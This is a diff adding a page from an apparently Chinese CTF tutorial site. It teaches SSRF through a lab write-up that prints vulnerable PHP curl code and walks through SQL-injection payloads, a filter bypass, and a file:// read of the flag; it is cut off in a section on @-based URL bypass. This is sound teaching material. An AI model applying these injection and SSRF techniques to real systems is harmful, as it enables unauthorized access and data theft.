@@ -1,0 +1,1461 @@
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" dir="ltr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+    <title>SSRF注入 | Hello CTF</title>
+  
+  <meta name="description" content="开源免费、新手友好的CTF(Capture The Flag,夺旗赛)入门教程">
+  <link rel="icon" href="../../assets/images/favicon.png">
+
+  <!-- 字体（与首页同源） -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Noto+Sans+SC:wght@400;500;700;800&display=swap" rel="stylesheet">
+
+  <!-- material 文章排版 CSS（pin 9.7.7 的 hash 文件名，升级主题时同步更新） -->
+  <link rel="stylesheet" href="../../assets/stylesheets/main.ec1eaa64.min.css">
+  <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+
+  <!-- Hello-CTF 外壳 -->
+  <link rel="stylesheet" href="../../shell/shell.css">
+  <link rel="stylesheet" href="../../shell/shell-docs.css">
+  <link rel="stylesheet" href="../../shell/shell-article.css">
+
+  <!-- 站点原有 extra_css（katex CDN / extra.css / bannerSlider.css 等） -->
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.css">
+  
+    <link rel="stylesheet" href="../../stylesheets/extra.css">
+  
+
+  <!-- admonition 等组件的图标 SVG 变量（原由 material base.html 注入） -->
+  
+
+
+
+  
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-V9998CDNR1"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-V9998CDNR1",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-V9998CDNR1",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+</head>
+<body data-md-color-scheme="default">
+
+  <!-- 主题初始化（先于渲染，避免闪烁）：hc-theme → shell data-theme + material slate -->
+  <script>
+    (function () {
+      var t = null;
+      try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+      if (t) {
+        document.documentElement.dataset.theme = t;
+        document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+      }
+    })();
+    window.__md_palette_sync = function (t) {
+      document.body.setAttribute("data-md-color-scheme", t === "dark" ? "slate" : "default");
+    };
+  </script>
+
+  <script src="../../shell/search.js"></script>
+  <script src="../../shell/shell.js"></script>
+  <script>Shell.mount({ active: "" });</script>
+
+  <!-- 主区：顶部文档导航 + 文章 + TOC -->
+  <div class="main">
+    <nav class="hc-topnav" aria-label="文档导航">
+      <div class="hc-topnav-inner">
+        
+          
+          
+            <a class="tn-item tn-single" href="../../hc-start/"><svg class="ic tn-ico"><use href="#i-book"/></svg>快速开始</a>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-book"/></svg>前言<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-preface/">前言</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/about/">关于本书</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/usage/">食用方法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-preface/join/">加入我们</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-wrench"/></svg>环境<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-env/">环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/CTFtool/">工具一览</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Docker_On_Linux/">Docker环境</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-env/Crypto/">Crypto环境设置</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-puzzle"/></svg>MISC<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-misc/">MISC | 杂项</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/osint/">信息收集</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Encode_extra/">编码扩展</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file/">文件基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/Archivefile/">压缩包</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/stego/">图片隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_stego/">文件隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/audio_stego/">音频隐写</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/pcap/">流量分析</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/industrial/">工控类</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/memory/">内存取证</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-misc/file_sign/">附:文件签名表</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item on">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-globe"/></svg>Web<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../">Web | 网络攻防</a>
+    
+  
+    
+      <a class="tn-link" href="../web_start/">Web入门题单</a>
+    
+  
+    
+      <a class="tn-link" href="../sensitive_info/">敏感信息泄露</a>
+    
+  
+    
+      <a class="tn-link" href="../php_basic/">PHP基础</a>
+    
+  
+    
+      <a class="tn-link" href="../php_unser_base/">PHP反序列化基础</a>
+    
+  
+    
+      <a class="tn-link" href="../sql_injection/">SQL注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xss/">XSS攻击</a>
+    
+  
+    
+      <a class="tn-link" href="../include/">文件包含</a>
+    
+  
+    
+      <a class="tn-link" href="../ssti/">SSTI注入</a>
+    
+  
+    
+      <a class="tn-link" href="../xxe/">XXE注入</a>
+    
+  
+    
+      <a class="tn-link on" href="./">SSRF注入</a>
+    
+  
+    
+      <a class="tn-link" href="../php_code_audit/">PHP 代码审计</a>
+    
+  
+    
+      <a class="tn-link" href="../rce/">RCE</a>
+    
+  
+    
+      <a class="tn-link" href="../file_upload/">文件上传</a>
+    
+  
+    
+      <a class="tn-link" href="../dir_traversal/">目录穿越</a>
+    
+  
+    
+      <a class="tn-link" href="../logical_vuln/">逻辑漏洞</a>
+    
+  
+    
+      <a class="tn-link" href="../any_file_read/">任意文件读取</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-lock"/></svg>Crypto<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-crypto/">Crypto | 密码学</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Recap/">前情提要</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Encode/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Classicalcipher/">古典密码</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-crypto/Moderncipher/">现代密码</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-cpu"/></svg>Reverse<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-reverse/">逆向工程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%95%E5%AF%BC%E7%AF%87%EF%BC%9A%E7%81%B5%E9%AD%82FAQ/">引导篇：灵魂FAQ</a>
+    
+  
+    
+      <div class="tn-group">编译与可执行文件</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/C%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/">C语言基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%98%E5%82%A8%E7%BB%93%E6%9E%84/">存储结构</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9A%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6/">可执行文件</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">交互式反汇编工具IDA</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/StartWithIDA/">从零开始的IDA</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/">IDA动态调试</a>
+    
+  
+
+    
+  
+    
+      <div class="tn-group">常见算法</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%9F%BA%E6%9C%AC%E8%BF%90%E7%AE%97/">基本运算</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%BC%96%E7%A0%81%E5%9F%BA%E7%A1%80/">编码基础</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%AD%97%E8%8A%82%E6%B5%81%E7%AE%97%E6%B3%95/">字节流算法</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">分组密码</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/z3%E7%BA%A6%E6%9D%9F%E6%B1%82%E8%A7%A3/">z3约束求解</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Quick%20Start%EF%BC%9AASM%E6%B1%87%E7%BC%96/">x86 汇编初步</a>
+    
+  
+    
+      <div class="tn-group">代码保护与对抗</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%8A%B1%E6%8C%87%E4%BB%A4/">花指令</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E5%A3%B3/">加壳</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/VM/">VM</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/SMC/">SMC</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/">异常处理</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%A4%9A%E7%BA%BF%E7%A8%8B/">多线程</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/TLS%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0/">TLS回调函数</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E5%8F%8D%E8%B0%83%E8%AF%95/">反调试</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E6%8E%A7%E5%88%B6%E6%B5%81%E5%B9%B3%E5%9D%A6%E5%8C%96/">控制流平坦化</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">符号执行</a>
+    
+  
+    
+      <div class="tn-group">语言与框架</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Python/">Python</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/NET/">.NET</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Rust/">Rust</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/JavaScript/">JavaScript</a>
+    
+  
+
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/Android/">Android平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-reverse/%E8%A7%A3%E9%A2%98%E6%8A%80%E5%B7%A7/">解题技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-terminal"/></svg>Pwn<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-pwn/">Pwn | 二进制安全</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/wsl2_environment/">wsl2下的环境配置</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Asm_x86/">汇编语言(x86)</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Stack_Overflow/">栈上数组越界&栈溢出</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP/">ROP入门</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/ROP_Tricks/">常见的ROP技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/rop_add_v1/">ROP进阶</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-pwn/Protections/">常见保护</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-shield"/></svg>AWD<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_about/">AWD介绍</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_platform/">AWD平台</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_web.exp/">【WEB】AWD技巧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-awd/awd_pwn.exp/">【PWN】AWD技巧</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-bot"/></svg>AI<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-ai/">AI | 人工智能</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/What_is_AI/">初识AI</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-ai/MLP/">你的第一个神经网络</a>
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-link"/></svg>区块链<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <div class="tn-group">Move</div>
+      
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x00/">从0开始的签到题</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x01/">独特的所有权</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x02/">神奇的时钟</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x03/">对象与燃气</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-blockchain/Move/0x04/">多样的泛型</a>
+    
+  
+
+    
+  
+</div>
+            </div>
+          
+        
+          
+          
+            <div class="tn-item">
+              <span class="tn-label"><svg class="ic tn-ico"><use href="#i-tag"/></svg>附录<svg class="ic tn-chev"><use href="#i-chev-down"/></svg></span>
+              <div class="tn-drop">
+  
+    
+      <a class="tn-link" href="../../hc-appendix/how-to-ask/">提问的智慧</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/NSSCTF_Usage/">NSSCTF平台使用</a>
+    
+  
+    
+      <a class="tn-link" href="../../hc-appendix/book/">推荐书单</a>
+    
+  
+</div>
+            </div>
+          
+        
+      </div>
+    </nav>
+    <div class="doc-layout">
+      <article class="md-typeset hc-article">
+        <!-- Tags -->
+
+
+<!-- Actions -->
+<!-- Actions -->
+
+
+  <!-- Edit button -->
+  
+
+  <!-- View button -->
+  
+
+
+<!-- Page content -->
+<div><h1 id="ssrf">SSRF注入<a class="headerlink" href="#ssrf" title="Permanent link">¶</a></h1>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-1.md -->
+<h3 id="file">file 伪协议读取任意文件<a class="headerlink" href="#file" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17da3d0e0a243d4ffc410.jpg"></p>
+<p>打开网页有登录有注册</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17e1cd0e0a243d4ffc414.jpg"></p>
+<p>访问 robots.txt 发现有个不可访问文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b17e32d0e0a243d4ffc41a.jpg"></p>
+<p>下载下来拿到源码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="cp">&lt;?php</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">class</span> <span class="nc">UserInfo</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="p">{</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>    <span class="k">public</span> <span class="nv">$name</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>    <span class="k">public</span> <span class="nv">$age</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>    <span class="k">public</span> <span class="nv">$blog</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$age</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">)</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>    <span class="p">{</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span> <span class="o">=</span> <span class="nv">$name</span><span class="p">;</span>
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">age</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$age</span><span class="p">;</span>
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span> <span class="o">=</span> <span class="nv">$blog</span><span class="p">;</span>
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>    <span class="p">}</span>
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>    <span class="k">function</span> <span class="nf">get</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>    <span class="p">{</span>
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>        <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>        <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>        <span class="nv">$output</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>        <span class="nv">$httpCode</span> <span class="o">=</span> <span class="nb">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLINFO_HTTP_CODE</span><span class="p">);</span>
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>        <span class="k">if</span><span class="p">(</span><span class="nv">$httpCode</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>            <span class="k">return</span> <span class="mi">404</span><span class="p">;</span>
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span class="p">}</span>
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>        <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>        <span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>    <span class="p">}</span>
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>
+<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">getBlogContents</span> <span class="p">()</span>
+<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>    <span class="p">{</span>
+<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">);</span>
+<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>    <span class="p">}</span>
+<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>
+<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>    <span class="k">public</span> <span class="k">function</span> <span class="nf">isValidBlog</span> <span class="p">()</span>
+<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>    <span class="p">{</span>
+<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>        <span class="nv">$blog</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">blog</span><span class="p">;</span>
+<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>        <span class="k">return</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="p">,</span> <span class="nv">$blog</span><span class="p">);</span>
+<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>    <span class="p">}</span>
+<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>
+<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a><span class="p">}</span>
+</code></pre></div>
+<p>重点是这段代码，先初始化 cURL 会话并返回一个 cURL 句柄</p>
+<p>设置 cURL 选项，指定要请求的 URL，1 表示开启执行 curl_exec() 时</p>
+<p>返回响应内容而不是直接输出，这里就存在 SSRF 漏洞</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">function get($url)</span>
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    {</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="x">        $ch = curl_init();</span>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">        curl_setopt($ch, CURLOPT_URL, $url);</span>
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="x">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span>
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="x">        $output = curl_exec($ch);</span>
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="x">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span>
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="x">        if($httpCode == 404) {</span>
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="x">            return 404;</span>
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="x">        }</span>
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="x">        curl_close($ch);</span>
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a><span class="x">        return $output;</span>
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a><span class="x">    }</span>
+</code></pre></div>
+<p>回头去注册一个账号</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18608d0e0a243d4ffc514.jpg"></p>
+<p>看到名字是蓝色的，点击</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18619d0e0a243d4ffc515.jpg"></p>
+<p>来的一个新页面，注意 URL 参数有一个 no</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18628d0e0a243d4ffc516.jpg"></p>
+<p>改为 2 居然报错了</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18635d0e0a243d4ffc517.jpg"></p>
+<p>加一个 ' 报数据库的错误，那这里就存在 SQL 注入，加了单引号和双引号都相同的错误</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1864fd0e0a243d4ffc518.jpg"></p>
+<p>不加引号直接 or 1=1 # 回显正常</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1865fd0e0a243d4ffc519.jpg"></p>
+<p>order by 5 报错，再次测试 4 没有报错，说明只有 4 列</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18681d0e0a243d4ffc51b.jpg"></p>
+<p>直接 -1 union select 1,2,3,4 # 被过滤空格应该是</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18697d0e0a243d4ffc51c.jpg"></p>
+<p>使用 /**/ 代替空格绕过</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b186a8d0e0a243d4ffc51d.jpg"></p>
+<p>接下来爆库、表、字段</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b186bbd0e0a243d4ffc51e.jpg"></p>
+<p>最后发现 data 是个序列化的值</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b186ded0e0a243d4ffc521.jpg"></p>
+<p>结合之前的备份代码，我们可以设置 blog 为 file 伪协议来读取 flag 文件，然后反序列化传入到第四个字段</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b186f1d0e0a243d4ffc523.jpg"></p>
+<p>构造 payload 执行</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b18701d0e0a243d4ffc525.jpg"></p>
+<p>右键查看源代码可以看到文件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1871cd0e0a243d4ffc526.jpg"></p>
+<p>打开再查看源代码拿到 flag</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/67b1872cd0e0a243d4ffc52a.jpg"></p>
+<!-- Imported from D:\\Book\\Web\\Chapter15\15-10.md -->
+<h3 id="_1">@指定域名绕过<a class="headerlink" href="#_1" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/687f7e2658cb8da5c8cbd450.png"></p>
+<p>给出提示，URL 参数的值中必须包含有 <code>http://notfound.ctfhub.com</code></p>
+<p>可以采用 @，也就是  HTTP  基本身份认证绕过</p>
+<p>HTTP 基本身份认证允许 Web 浏览器或其他客户端程序在请求时提供用户名和口令形式的身份凭证的一种登录验证方式</p>
